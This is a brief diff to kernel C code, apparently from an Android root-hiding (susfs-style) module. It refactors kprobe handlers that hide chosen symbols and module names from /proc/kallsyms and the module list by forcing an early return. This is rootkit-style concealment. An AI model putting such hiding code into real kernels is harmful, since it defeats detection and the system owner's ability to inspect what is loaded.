@@ -609,13 +609,13 @@ static int hide_syms_s_show_pre(struct kprobe *kp, struct pt_regs *regs)
 	if (name_should_hide(iter->name)) {
 		atomic_inc(&hide_hit_count);
 		regs->regs[0] = 0;              /* s_show returns 0 */
-		regs->pc = regs->regs[30];      /* skip the line */
+		susfs_probe_return(regs);      /* skip the line */
 		return 1;
 	}
 	if (iter->module_name[0] && hide_module_name_match(iter->module_name)) {
 		atomic_inc(&n_kallsyms_mod_skipped);
 		regs->regs[0] = 0;
-		regs->pc = regs->regs[30];
+		susfs_probe_return(regs);
 		return 1;
 	}
 	return 0;
@@ -664,7 +664,7 @@ static int hide_syms_m_show_pre(struct kprobe *kp, struct pt_regs *regs)
 
 	atomic_inc(&n_modlines_skipped);
 	regs_set_return_value(regs, 0);		/* no output for this entry */
-	regs->pc = regs->regs[30];
+	susfs_probe_return(regs);
 	return 1;
 }
 
